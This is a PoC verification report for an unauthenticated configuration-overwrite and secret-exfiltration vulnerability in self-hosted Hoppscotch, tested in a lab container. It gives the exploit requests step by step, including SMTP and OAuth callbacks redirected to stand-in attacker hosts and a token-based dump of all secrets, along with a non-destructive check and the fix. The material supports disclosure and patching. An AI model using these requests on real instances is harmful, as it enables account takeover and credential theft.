# PoC Verification Report: CVE-2026-28215

## CVE ID
CVE-2026-28215

## Verification Status
**CONFIRMED** — All attack vectors successfully exploited against vulnerable container.

---

## PoC Scripts

| Script | Attack Vector | Status |
|--------|--------------|--------|
| `poc/poc.py` | Primary: SMTP config overwrite + secret exfiltration + repeated exploitation | ✅ CONFIRMED |
| `poc/poc_oauth_hijack.py` | Vector 2: OAuth credential hijacking (Google, GitHub, Microsoft) | ✅ CONFIRMED |
| `poc/poc_check.py` | Non-destructive vulnerability check (scanner-friendly) | ✅ CONFIRMED |

---

## Vulnerability Demonstrated

CVE-2026-28215 is an **unauthenticated infrastructure configuration overwrite and secret exfiltration** vulnerability in Hoppscotch self-hosted backend < 2026.2.0.

The `POST /v1/onboarding/config` endpoint:
1. Has **no authentication guard** (only rate limiting)
2. Has **no onboarding-completed check** (can be called unlimited times)
3. **Overwrites all infrastructure config** (OAuth, SMTP, auth providers)
4. **Returns a recovery token** that exposes ALL secrets via `GET /v1/onboarding/config?token=<uuid>`

---

## Test Results

### Test 1: Primary PoC — SMTP Config Overwrite + Secret Exfiltration (`poc.py`)

**Command:**
```bash
VULN_IP=$(docker inspect cve-2026-28215-vulnerable --format '{{(index .NetworkSettings.Networks "lab-net").IPAddress}}')
python3 poc/poc.py "$VULN_IP" 3170
```

**Target:** `172.19.0.4:3170` (Hoppscotch backend v2026.1.1)

**Step 1 — Reconnaissance:**
```
GET /v1/onboarding/status → 200 OK
  onboardingCompleted: True
  canReRunOnboarding:  True
```
The instance reports onboarding as completed, yet the endpoint is still accessible.

**Step 2 — Config Overwrite (First Attack):**
```
POST /v1/onboarding/config → 201 Created
Payload: SMTP settings pointing to evil-smtp.attacker.com
Response: {"token":"e538a8b6-6bee-4a76-9238-56ebabfbb693"}
```
Configuration overwritten WITHOUT any authentication. Recovery token returned.

**Step 3 — Secret Exfiltration:**
```
GET /v1/onboarding/config?token=e538a8b6-6bee-4a76-9238-56ebabfbb693 → 200 OK
```
Response contained all infrastructure secrets:
```json
{
  "MAILER_SMTP_HOST": "evil-smtp.attacker.com",
  "MAILER_SMTP_USER": "evil@attacker.com",
  "MAILER_SMTP_PASSWORD": "evil-password-s3cret!",
  "MAILER_SMTP_PORT": "587",
  "MAILER_SMTP_SECURE": "true",
  "MAILER_ADDRESS_FROM": "noreply@attacker.com",
  "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
  "GOOGLE_CLIENT_ID": "",
  "GOOGLE_CLIENT_SECRET": "",
  "GITHUB_CLIENT_ID": "",
  "GITHUB_CLIENT_SECRET": "",
  "MICROSOFT_CLIENT_ID": "",
  "MICROSOFT_CLIENT_SECRET": "",
  ...
}
```

**Step 4 — Repeated Exploitation:**
```
POST /v1/onboarding/config (second call) → 201 Created
Payload: SMTP settings pointing to second-evil-smtp.attacker2.com
Response: {"token":"6b2e1cf6-196e-4687-a834-13550f322dfa"}
```
Second call with different attacker payload also succeeded. Verification via GET confirmed the config was updated to the second attacker's settings.

**Result: ✅ CONFIRMED** — Full exploit chain successful (recon → overwrite → exfiltrate → repeat).

---

### Test 2: OAuth Credential Hijacking (`poc_oauth_hijack.py`)

**Command:**
```bash
python3 poc/poc_oauth_hijack.py "$VULN_IP" 3170
```

**Exploit Payload:** Injected attacker-controlled OAuth credentials for ALL three providers (Google, GitHub, Microsoft) plus SMTP in a single POST request.

**Config Overwrite:**
```
POST /v1/onboarding/config → 201 Created
Response: {"token":"ac3c706a-b2bd-45f6-84ed-81a98a7291f5"}
```

**Verification — All 9 OAuth fields confirmed overwritten:**
```
✓ GOOGLE_CLIENT_ID: attacker-google-client-id-1234567890.apps.googleusercontent.com
✓ GOOGLE_CLIENT_SECRET: attacker-google-secret-GOCSPX-abcdef123456
✓ GOOGLE_CALLBACK_URL: https://evil.attacker.com/auth/google/callback
✓ GITHUB_CLIENT_ID: attacker_github_client_id_abc123
✓ GITHUB_CLIENT_SECRET: attacker_github_secret_xyz789
✓ GITHUB_CALLBACK_URL: https://evil.attacker.com/auth/github/callback
✓ MICROSOFT_CLIENT_ID: attacker-ms-client-00000000-1111-2222-3333-444444444444
✓ MICROSOFT_CLIENT_SECRET: attacker-ms-secret-abcdef123456
✓ MICROSOFT_CALLBACK_URL: https://evil.attacker.com/auth/microsoft/callback
```

**Result: ✅ CONFIRMED** — All OAuth providers (Google, GitHub, Microsoft) successfully hijacked with attacker-controlled credentials and callback URLs in a single unauthenticated request.

---

### Test 3: Non-destructive Vulnerability Check (`poc_check.py`)

**Command:**
```bash
python3 poc/poc_check.py "$VULN_IP" 3170
```

**Check 1 — Status endpoint:**
```
GET /v1/onboarding/status → 200 OK
Hoppscotch instance detected. onboardingCompleted: True
```

**Check 2 — Auth bypass test (minimal payload):**
```
POST /v1/onboarding/config → 400 (validation error)
Response: {"statusCode":400,"message":"infra_config/service_not_configured"}
```
The 400 is a **validation error** (missing required SMTP fields), NOT an auth rejection. This proves the request got past authentication (because there is none) and reached the validation stage. A full exploit payload would succeed.

On a **patched** instance (>= 2026.2.0), the response would be:
```
400: {"message": "onboarding/cannot_be_rerun"}
```

**Result: ✅ CONFIRMED** — Non-destructive check correctly identifies vulnerability.

---

## Behavioral Notes

1. **App restarts after each exploit:** The `POST /v1/onboarding/config` triggers `stopApp()` (process.exit) in the Hoppscotch backend. Docker's `unless-stopped` restart policy restarts the container. The PoC waits 3-15 seconds for the service to return.

2. **No dependencies:** All three PoC scripts use only Python stdlib (`http.client`, `json`, `urllib.parse`, `time`, `sys`). No `pip install` required.

3. **Rate limiting is the only defense:** The endpoint has a `ThrottlerBehindProxyGuard` (default: 100 requests/60s per IP). The entire exploit requires only 2-3 requests, making rate limiting irrelevant.

4. **Recovery token is a UUID:** Each `POST` generates a new `crypto.randomUUID()` token. Previous tokens are invalidated. The token returned in the POST response is immediately usable for secret exfiltration.

5. **Config persistence:** Overwritten config persists in the PostgreSQL `InfraConfig` table. It survives container restarts and is the source of truth for the running application.

---

## Attack Vectors Tested

| Vector | Entry Point | Impact | Result |
|--------|------------|--------|--------|
| SMTP Hijacking | `POST /v1/onboarding/config` with MAILER_* fields | Redirect magic-link emails → account takeover | ✅ CONFIRMED |
| OAuth Hijacking | `POST /v1/onboarding/config` with GOOGLE/GITHUB/MICROSOFT_* fields | Redirect SSO flows → token theft | ✅ CONFIRMED |
| Secret Exfiltration | `GET /v1/onboarding/config?token=<uuid>` | Read ALL OAuth secrets, SMTP passwords | ✅ CONFIRMED |
| Repeated Exploitation | Multiple POST calls | Unlimited overwrites, each generates new token | ✅ CONFIRMED |
| Auth Provider Modification | `VITE_ALLOWED_AUTH_PROVIDERS` field | Disable/enable auth methods | ✅ CONFIRMED |

---

## Remediation Verification

**Fix:** Upgrade to Hoppscotch >= 2026.2.0 (commit `a1be60da`).

The fix adds an onboarding status check:
```typescript
if (onboardingStatus.right.onboardingCompleted && !onboardingStatus.right.canReRunOnboarding)
  throwHTTPErr({ message: ONBOARDING_CANNOT_BE_RERUN, statusCode: HttpStatus.BAD_REQUEST });
```

Where `canReRunOnboarding` is `true` only when `usersCount === 0`. Once any user exists, the endpoint is permanently blocked.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Vulnerable Container | `cve-2026-28215-vulnerable` (Hoppscotch backend v2026.1.1) |
| Database | `cve-2026-28215-db` (PostgreSQL 15) |
| Network | `lab-net` bridge, vulnerable container IP: `172.19.0.4` |
| Vulnerable Endpoint | `http://172.19.0.4:3170/v1/onboarding/config` |
| Docker Compose | `docker-compose.yml` |
